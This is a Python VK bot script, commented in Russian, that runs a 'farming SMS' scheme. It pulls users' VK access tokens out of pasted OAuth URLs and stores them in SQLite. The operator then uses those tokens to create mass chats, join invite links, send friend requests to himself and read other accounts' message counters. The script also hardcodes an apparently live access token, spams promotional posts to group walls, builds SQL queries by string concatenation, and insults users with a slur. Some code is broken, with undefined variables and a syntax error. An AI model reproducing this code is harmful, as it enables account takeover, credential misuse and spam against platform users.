import sqlite3
import requests
import vk_api, time
from vk_api.longpoll import VkLongPoll, VkEventType
from tok import users,titl,tam


idg1 = -39130136
idg2 = -24261502
idg3 = -153162012
#ид групп в которых будет пиар.
piartext = "копишь SMS? Хочешь много смс? Тогда мы ждём тебя!❤️/n‼️существует farming SMS где ты можешь набрать большое количество смс/n за регистрацией пишешь: [id581874381|Роман]"
#пиар текст


conect = sqlite3.connect("server.bd")
cursor = conect.cursor()
conect.execute("""CREATE TABLE IF NOT EXISTS users(
		tok TEXT ,
		ids INT PRIMARY KEY

)""")
conect.commit()
token=("vk1.a.aUpq66QRRVPmLK_nypGIcNKJ-rxwzBQ8aSEahQkt-3ZF9yjZgFf7SmPfkB2IiwLv1h6nqZ3-Jd32BFUkTxinMuS1pMLzOKuyWSoRWe8gQ_veZYlYe0BwZM6lQkGVe04RsGuarpt0MmIXq278GH7dGZ0_czKNPP6pB7ML40pRWuoDqEcZBUny8r8SNOuP8iSg7AN6weSWjy-t_fzFqCw6ug")
vk_session = vk_api.VkApi(token=token)
api = vk_session.get_api()
my_idd=api.account.getProfileInfo()
my_id=(my_idd['id'])




cursor.execute("SELECT tok FROM users")
three_results = cursor.fetchmany(200)
id_list = three_results
vse=(len(id_list))


while True:
	try:
		print("✅Код успешно запущен.")
		vk_session = vk_api.VkApi(token=token)
		bh = vk_api.VkApi(token = token)
		give = bh.get_api()
		longpoll = VkLongPoll(bh)



		def blasthack(id, text):
			    bh.method('messages.send', {'user_id' : id, 'message' : text, 'random_id': 0, })
		def piar():
			   bh.method('wall.post',{'owner_id' : idg1, 'message' : piartext})
			   bh.method('wall.post',{'owner_id' : idg2, 'message' : piartext})
			   bh.method('wall.post',{'owner_id' : idg3, 'message' : piartext})
			   bh.method('wall.post',{'owner_id' : idg4, 'message' : piartext})
			   bh.method('wall.post',{'owner_id' : idg5, 'message' : piartext})

		def blasthac(id, text):
			pipp=str(id_sms)
			pippp=str(pipp)
			vk_session = vk_api.VkApi(token=token)
			api = vk_session.get_api()
			niaa=api.messages.getById(message_ids=pippp)
			per_id=str(niaa['items'][0]['peer_id'])
			pkl = str(per_id)
			bh.method('messages.edit', {'peer_id' : pkl, 'message' : text, 'random_id': 0, 'message_id' : id_sms, })


		def drud():
			pipp=str(id_sms)
			pippp=str(pipp)
			vk_session = vk_api.VkApi(token=token)
			api = vk_session.get_api()
			niaa=api.messages.getById(message_ids=pippp)
			print(niaa)
			try:
				try:
					per_id=str(niaa['items'][0]['fwd_messages'][0]['peer_id'])
				except Exception as er:
					per_id=str(niaa['items'][0]['peer_id'])

				print(per_id)
				api.friends.delete(user_id=per_id)

				blasthac(id, "User успешно удален☑️ id"+str(per_id))
			except Exception as er:
				blasthac(id, "Невозможно удалить users,перешлите его смс и отметьте")





		def idotprp():
			try:
				global idotpr
				idotpr=("")
				print("Раб2")
				pipp=str(event.message_id)
				pippp=str(pipp)
				print("раб")

				vk_session = vk_api.VkApi(token=token)
				api = vk_session.get_api()

				niaaa=api.messages.getById(message_ids=pippp)
				print(niaaa)

				try:

					idotp=(niaaa['items'][0]['from_id'])

					idotpr=str(idotp)
					print(idotpr)
				except Exception as er:


					idotpr=(niaaa['items'][0]['from_id'])
					idotpr=str(idotp)
					print(idotpr)
			except Exception as er:
				print("ошбика в idotpr")


		def drdob():
			pipp=str(id_sms)
			pippp=str(pipp)
			vk_session = vk_api.VkApi(token=token)
			api = vk_session.get_api()
			niaa=api.messages.getById(message_ids=pippp)
			print(niaa)
			try:
				try:
					per_id=str(niaa['items'][0]['fwd_messages'][0]['peer_id'])
				except Exception as er:
					per_id=str(niaa['items'][0]['peer_id'])

				blasthac(id, "User успешно удален✅ id"+str(per_id))
			except Exception as er:
				blasthac(id, "Невозможно удалить users,перешлите его смс и отметьте❎")


		def idsmss():
			vk_session = vk_api.VkApi(token=token)
			api = vk_session.get_api()
			pipp=str(id_sms)
			pippp=str(pipp)
			niaa=api.messages.getById(message_ids=pippp)
			print(niaa)
			nalll=str(niaa)
			try:
				pir_id=str(niaa['items'][0]['reply_message']['from_id'])
			except Exception as er:
				pir_id=str(niaa['items'][0]['fwd_messages'][0]['peer_id'])

			cursor.execute("SELECT tok FROM users WHERE ids = "+pir_id+" ")




			ibd=cursor.fetchmany(200)
			print(ibd)
			ibdb=str(ibd)
			uuu=(ibdb[3:-4])
			print(uuu)
			api = vk_session.get_api()
			idotpr=()
			try:
				vk_session = vk_api.VkApi(token=uuu)
				api = vk_session.get_api()
				podp1=api.users.getFollowers(token=uuu)
				soob=api.account.getCounters(filter="messages")
				sobb=(soob["messages"])
				sooob=str(sobb)




				podp2=(podp1['count'])
				podp=str(podp2)
				moiid=str(my_id)
				blasthac(id,"👤profile @id"+pir_id+"\n"+"🎆User"+"\n"+"🖤подписчиков:  "+podp+"\n"+ "🖤непрочитанных SMS: "+(sooob))


			except Exception as er:
				blasthac(id, "не найдет в базе данных❎")






		def dell():
			pipp=str(id_sms)
			pippp=str(pipp)
			vk_session = vk_api.VkApi(token=token)
			api = vk_session.get_api()
			niaa=api.messages.getById(message_ids=pippp)
			print(niaa)
			try:
				try:
					per_id=str(niaa['items'][0]['fwd_messages'][0]['peer_id'])
				except Exception as er:
					per_id=str(niaa['items'][0]['peer_id'])
				cursor.execute("DELETE FROM users WHERE ids="+per_id+";")
				conect.commit()
				blasthac(id, "User успешно удален ✅  "+str(per_id))
			except Exception as er:
				blasthac(id, "Невозможно удалить users,перешлите его смс и отметьте✅")



		def lam():
			pipp=str(id_sms)
			pippp=str(pipp)
			vk_session = vk_api.VkApi(token=token)
			api = vk_session.get_api()
			niaa=api.messages.getById(message_ids=pippp)
			print(niaa)
			try:

				texttt=str(niaa['items'][0]['reply_message']['text'])
				try:
					per_id=str(niaa['items'][0]['peer_id'])
				except Exception as er:
					per_id=str(niaa['items'][0]['fwd_messages'][0]['peer_id'])
				print(texttt)
				print(per_id)
				textt=(texttt)
				obrez=(textt.split('=')[1])
				obrezz=(obrez.split('&')[0])
				obr = str(obrezz)
				vk_session = vk_api.									VkApi(token=(obr))
				api = vk_session.get_api()
				tok=(obr)
				ids=per_id
				users_list=[(tok),(ids)]
				cursor.execute("INSERT INTO users VALUES (?,?);", users_list)
				conect.commit()
				print(users_list)
				try:
					api.messages.joinChatByInviteLink(link="https://vk.me/join/kqyA1TPr4Ce2BGXinL5zmjPOmpKVUIWkfOI=")
					blasthac(id, """
				✅VKK token activated✅
Вы успешно зарегистрированы в farming. 
‼️После рега,админ вам пропишет команду и все юзеры бс кинут заявку вам в др. Примите их,ибо беседы с вами создаваться не будут!!!
‼️При смене данных от сторы пишем админу который вас регал,иначе вам не будут идти смс.
!регестрируясь у нас вы соглашаетесь с пользовательским соглашением, вся информация по статье: vk.com/@your_tv_series_lover-hotite-sdelat-mir-luchshe
⚠️В СТАТЬЕ ВСЕ ЕСТЬ. НЕ НУЖНО ДОЛБИТЬ ЛИЧКУ АДМИНУ И СПРАШИВАТЬ ЧТО ЭТО ТАКОЕ.

🎇Сарделька:
[id581874381|гкодер]

🥰Котлетка:
[id636042142| идиотик]
				""")
				except Exception as er:
					blasthac(id, """Уже есть в базе данных❎""")





			except Exception as er:
				blasthac(id, "❎Все успешно! Если пользователь есть в главной беседе, то все успешно, если его нет то для начала проверьте токен на валидность зарегестрируйте его заного и добавьте его в беседу❎")








		def chek():
			cursor.execute("SELECT ids FROM users")
			iddd = cursor.fetchmany(200)
			print(iddd)
			for i in range(vse):
				ibdb = str(iddd[i])
				uuu=(ibdb[1:-2])
				cursor.execute("select tok from users where ids ="+uuu+"")
				nnn=(cursor.fetchmany())
				ooo=str(nnn)
				nin=(ooo[3:-4])
				vk_session = vk_api.VkApi(token=nin)
				api = vk_session.get_api()
				try:
					onli=api.account.setOffline(token=nin)
					onlio=str(onli)
				except Exception as er:
					if er != [5]:
						print(uuu)
						print(nin)
						nerab.append(uuu)




		def bystdr():
			cursor.execute("SELECT ids FROM users")
			iddd = cursor.fetchmany(200)
			print(iddd)
			for i in range(vse):
				ibdb = str(iddd[i])
				uuu=(ibdb[1:-2])
				cursor.execute("select tok from users where ids ="+uuu+"")
				nnn=(cursor.fetchmany())
				ooo=str(nnn)
				nin=(ooo[3:-4])
				vk_session = vk_api.VkApi(token=nin)
				api = vk_session.get_api()
				idp = str(id)
				try:
					api.friends.add(token=nin, user_id=idp)

				except Exception as er:
					if er != [5]:
						print(uuu)
						print(nin)
						nerab.append(uuu)

























		def strt():
			count = 0
			while count < int(oby):
				time.sleep(300)
				for i in range(vse):
					vk_session = vk_api.VkApi(token=three_results[i])
					api = vk_session.get_api()

					try:
						api.messages.createChat(user_ids=users, title=titl)
						print(count)
						count += 1


					except Exception as er:
						print(er)


		def farma():
			vk_session = vk_api.VkApi(token=(message[7:]))
			api = vk_session.get_api()
			try:
				api.messages.joinChatByInviteLink(link="https://vk.me/join/iTxQ3qrc6BlU9qUpNEYvfqjIuihO5zIyIeo=")
				api.friends.add(user_id="581874381")




			except Exception as er:
				print(er)


		for event in longpoll.listen():
			if event.type == VkEventType.MESSAGE_NEW:

					message = event.text.lower()
					id = event.user_id
					idd = str(id)
					id_smss = event.message_id
					id_sms = str(id_smss)


					cursor.execute("SELECT tok FROM users")
					three_results = cursor.fetchmany(200)
					id_list = three_results
					vse=int(len(id_list))
					oby=vse*10
					rabid=[]
					vseid=[]
                    	
                    
					if message == "/пиар":
						idotprp()
						if str(idotpr) == str(my_id):
							blasthac(id, """
✅ЗАПУЩЕНО
!! Ожидайте...
""")
							piar()
                            				

					if message == "/рег":
						idotprp()
						if str(idotpr) == str(my_id):
							lam()





					if message == "/запуск":
						idotprp()
						if str(idotpr) == str(my_id):
							cursor.execute("SELECT tok FROM users")
							three_results = cursor.fetchmany(200)
							oo=str(three_results)
							#all_results = cursor.fetchall()
							print(three_results)
							blasthac(id, """
							💣Загрузка.... Ожидайте
                            💣Проверка токенов... 
							""")
							obyy=str(oby)
							blasthac(id, "💣 ЗАПУЩЕНО 💣 \n @all")


							strt()

					if message == "/стат" :
						try:
							print("rab")
							idotprp()
							print("Раб3")

							if str(idotpr) == str(my_id):
								print("смс отправлено")
								print(idotpr)
								idotpr=("")
								print(idotpr)
								cursor.execute("SELECT tok FROM users")
								three_results = cursor.fetchmany(200)
								id_list = three_results
								vse=str(len(id_list))
								obyy=str(oby)
								try:
									blasthac(id, "💻 | Users in database: "+(vse)+"\n"+" ☁️| SMS per launch: "+(obyy)+"\n"+"🖤 FARM Bloody Rose 🖤")

								except Exception as er:
									blasthac(id, "💻 | Users in database: "+(vse)+"\n"+" ☁️| SMS per launch: "+(obyy)+"\n"+"🖤 FARM Bloody Rose 🖤")
						except Exception as er:
								print(er)







					if message == "/-др":
						idotprp()
						if str(idotpr) == str(my_id):
							drud()

					if message[0:5] == "/дэл ":
						idotprp()
						if str(idotpr) == str(my_id):
							try:
								killed=str(message[5:])
								cursor.execute("DELETE FROM users WHERE ids="+killed+";")
								conect.commit()


								blasthac(id, "Пока-пока" @id+(killed))
							except Exception as er:
								blasthac(id, "не верный ID")


					if message == "/инфо":
						idotprp()
						if str(idotpr) == str(my_id):

							idsmss()






					if message == "/смс":
						idotprp()
						if str(idotpr) == str(my_id):
							vk_session = vk_api.VkApi(token=token)
							api = vk_session.get_api()
							soob=api.account.getCounters(filter="messages")
							sobb=(soob["messages"])
							sooob=str(sobb)
							podp1=api.users.getFollowers()
							podp2=str(podp1['count'])
							podp=str(podp2)
							moiid=str(my_id)
							blasthac(id,"👤profile @id"+moiid+"\n"+"👑Владелец"+"\n"+"💥фанатов: "+podp+"\n"+ "🖤непрочитанных SMS: "+(sooob))





					if message == "/+др":
						idotprp()
						if str(idotpr) == str(my_id):



							try:
								drdob()

							except Exception as er:
								print(er)

					if message == "/дэл":
						idotprp()
						if str(idotpr) == str(my_id):
							try:
								dell()
							except Exception as er:
								idd=str(id)
								cursor.execute("DELETE FROM users WHERE ids="+idd+";")
								conect.commit()
								blasthack(id, "Пока-пока  @id"+str(id))

					if message == "/получить":
						idotprp()
						if str(idotpr) == str(my_id):
							blasthac(id, """
Вся информация на этой статье: 
vk.com/@your_tv_series_lover-hotite-sdelat-mir-luchshe
""")




					if message == "/бустдр":
						idotprp()
						if str(idotpr) == str(my_id):
							try:
								idm = str(id)
								blasthac(id, "идет добавление...")
								bystdr()
								ala=list(set(nerab))
								kika=str(ala)
								s1=kika.replace("'", "")
								s2=s1.replace("]", "|неактив]")
								s3=s2.replace("[", "[id")
								s4=s3.replace(",", "|неактив")
								s5=s4.replace(" ", "],[id")
								s6=s5.replace(",", "\n‼")
								if s6 == "[id|неактив]":
									idm = str(id)
									blasthac(id, "С [id"+(idm)+"|ноунеймом] теперь все дружат.\n❗Обязательно прими все заявки в друзья ❗")
									s1=()
									s2=()
									s3=()
									s4=()
									s5=()
									s6=()
									nerab=[]
								else:
									idm = str(id)
									blasthac(id, "С [id"+(idm)+"|ноунеймом] теперь все дружат.\n❗Обязательно прими все заявки в друзья ❗")

									s1=()
									s2=()
									s3=()
									s4=()
									s5=()
									s6=()
									nerab=[]
							except Exception as er:
								idm = str(id)
								blasthack(id, "С [id"+(idm)+"|ноунеймом] теперь все дружат.\n❗Обязательно прими все заявки в друзья ❗")
								bystdr()
								ala=list(set(nerab))
								kika=str(ala)
								s1=kika.replace("'", "")
								s2=s1.replace("]", "|неактив]")
								s3=s2.replace("[", "[id")
								s4=s3.replace(",", "|неактив")
								s5=s4.replace(" ", "],[id")
								s6=s5.replace(",", "\n‼")
								if s6 == "[id|неактив]":
									idm = str(id)
									blasthac(id, "С [id"+(idm)+"|🌆Юзером🌆] теперь все дружат.\n❗Обязательно прими все заявки в друзья ❗")
									s1=()
									s2=()
									s3=()
									s4=()
									s5=()
									s6=()
									nerab=[]
								else:
									idm = str(id)
									blasthac(id, "С [id"+(idm)+"|🌆Юзером🌆] теперь все дружат.\n❗Обязательно прими все заявки в друзья ❗")

									s1=()
									s2=()
									s3=()
									s4=()
									s5=()
									s6=()
									nerab=[]











					if message == "/чек":
						idotprp()
						if str(idotpr) == str(my_id):
							try:
								blasthac(id, "Поиск инвалидов...")
								chek()
								ala=list(set(nerab))
								kika=str(ala)
								s1=kika.replace("'", "")
								s2=s1.replace("]", "|Пидорас]")
								s3=s2.replace("[", "[id")
								s4=s3.replace(",", "|Пидорас")
								s5=s4.replace(" ", "],[id")
								s6=s5.replace(",", "\n‼")
								if s6 == "[id|Пидорас]":
									blasthac(id, "🌝Инвалиды не найдены🌝")
									s1=()
									s2=()
									s3=()
									s4=()
									s5=()
									s6=()
									nerab=[]
								else:
									blasthac(id, "‼"+str(s6))

									s1=()
									s2=()
									s3=()
									s4=()
									s5=()
									s6=()
									nerab=[]
							except Exception as er:
								blasthack(id, "Поиск инвалидов...")
								chek()
								ala=list(set(nerab))
								kika=str(ala)
								s1=kika.replace("'", "")
								s2=s1.replace("]", "|Пидорас]")
								s3=s2.replace("[", "[id")
								s4=s3.replace(",", "|Пидорас")
								s5=s4.replace(" ", "],[id")
								s6=s5.replace(",", "\n‼")
								if s6 == "[id|Пидорас]":
									blasthack(id, "🌝Инвалиды не найдены🌝")
									s1=()
									s2=()
									s3=()
									s4=()
									s5=()
									s6=()
									nerab=[]
								else:
									blasthack(id, "‼"+str(s6))

									s1=()
									s2=()
									s3=()
									s4=()
									s5=()
									s6=()
									nerab=[]



	except Exception as er:
		print(er)